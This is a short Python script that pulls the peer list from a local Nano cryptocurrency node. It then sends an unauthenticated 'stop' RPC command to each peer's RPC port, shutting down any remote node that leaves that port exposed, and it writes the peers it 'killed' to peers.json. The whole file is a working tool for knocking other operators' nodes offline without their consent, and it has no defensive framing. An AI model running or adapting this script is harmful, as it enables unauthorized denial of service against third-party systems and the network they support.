# Nano Node Peer Pull
import json
import requests
import os
import os.path

# get peers from nano node
def communicateNode(rpc_command, node_url, node_port, timeout):
    try:
        url = 'http://{0}:{1}'.format(node_url, node_port)
        res = requests.post(url, json=rpc_command, timeout=timeout)
        if res.ok:
            return res.json()
        else:
            return {'status': 'failed'}
    except:
        return {'status': 'failed'}

def getNanoPeers():
    return communicateNode({'action': 'peers'}, '0.0.0.0', 7076, 2)['peers']

def stopNode(node_url, node_port):
    print('attempting to kill: ', node_url, node_port)
    return communicateNode({'action': 'stop'}, node_url, node_port, 0.3)

# write json file and encode it
def writeJson(filename, data):
    with open(filename, 'w') as json_file:
        json.dump(data, json_file)

peers = getNanoPeers()
badPeers = []

if len(peers) > 0:
    for peer in peers:
        address = peer.split(']')
        port = int(address[1].replace(':', ''))
        port = port + 1
        address = address[0].replace('[', '').replace('::ffff:', '')
        res = stopNode(address, port)
        if 'success' in res:
            print('killed node: ', address, port)
            badPeers.append(peer)
        elif 'status' in res and port != 7076:
            res = stopNode(address, 7076)
            if 'success' in res:
                print('killed node: ', address, 7076)
                badPeers.append(peer)

if len(badPeers) > 0:
    writeJson('peers.json', badPeers)
